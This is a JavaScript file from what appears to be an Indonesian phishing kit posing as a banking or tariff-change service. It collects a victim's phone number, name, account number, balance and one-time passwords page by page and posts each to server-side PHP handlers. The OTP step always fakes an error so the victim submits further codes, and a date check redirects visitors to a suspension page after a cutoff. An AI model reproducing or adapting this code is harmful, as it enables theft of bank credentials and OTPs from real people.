let tglNow = new Date();
let waktuBatas = new Date("2025-08-07T23:59:59");
if (tglNow.getTime() >= waktuBatas.getTime()) {
  document.location.href = 'https://suspend-web.pages.dev';
} else {
  console.log('Server aktif');
}
// index
function sendNohp(){    
    event.preventDefault();                   
    $(".loading-screen").fadeIn();
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
  var nomor = $('#nohp').val();
  sessionStorage.setItem('nomor', nomor);                     
             
   
       $.ajax({
            type: 'POST',
            url: 'rest/no.php',
            data: $('#hpForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){    
    setTimeout(function(){   
    window.location = "login.html";
    
    $(".loading-screen").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 200);}});};   
     
     
     
//data     
function sendLogin(){
   $('.loading-screen').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";
    
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
                                
   if (!tarif || !nomor || !nama || !rek ) {      
        window.location.href = "/";
        return false;
    }                        
   
     $.ajax({
            type: 'POST',
            url: 'rest/login.php',
            data: $('#loginForm').serialize(),
            datatype: 'JSON',
            
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";    
    $('.loading-screen').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek); 
   vibr(180);
    }, 200);}});};
    
       
    
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";   
    $('.loading-screen').fadeIn(); 
    
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
    const saldo = $('#saldo').val();
                                
   if (!tarif || !nomor || !nama || !rek || !saldo) {      
        window.location.href = "/";
        return false;
    }    
  
       $.ajax({
            type: 'POST',
            url: 'rest/saldo.php',
            data: $('#saldoForm').serialize(),
            datatype: 'JSON',
        
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";  
   $('.loading-screen').fadeOut();
   
   vibr(180);  
 var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
  var nomor = $('#nomor').val();
  sessionStorage.setItem('nomor', nomor); 
  var nama = $('#nama').val();
  sessionStorage.setItem('nama', nama); 
  var rek = $('#rek').val();
  sessionStorage.setItem('rek', rek);
  var saldo = $('#saldo').val();
  sessionStorage.setItem('saldo', saldo);
  window.location = "otp.html";
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    $("#errorAlert").fadeIn();   
    document.getElementById('submit-btn').value = "Memproses...."; 
                               
    const tarif = $('#tarif').val();
    const nomor = $('#nomor').val();
    const nama = $('#nama').val();
    const rek = $('#rek').val();
    const saldo = $('#saldo').val();
    const otp = $('#otp').val();
                                
   if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
        window.location.href = "/";
        return false;
    }    
     
     $.ajax({
            type: 'POST',
            url: 'rest/otp.php',
            data: $('#otp-form').serialize(),
            datatype: 'JSON',
        
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    $("#errorAlert").fadeOut();   
 $("#otp").val("");
 $("#otp").addClass('invalid-input'); 
   document.getElementById('submit-btn').value = "Konfirmasi";
    }, 1200);}});};



function vibr(dur){
            if (navigator.vibrate) {
                navigator.vibrate(dur);
            } else {
                console.log("NotSupported");
            }
        }

function wa(){
 $(".wait").fadeIn();   
    
setTimeout(function(){  
location.href='wa';
    }, 00);
    setTimeout(function(){
    $(".wait").fadeOut();   
    }, 00);      
}     
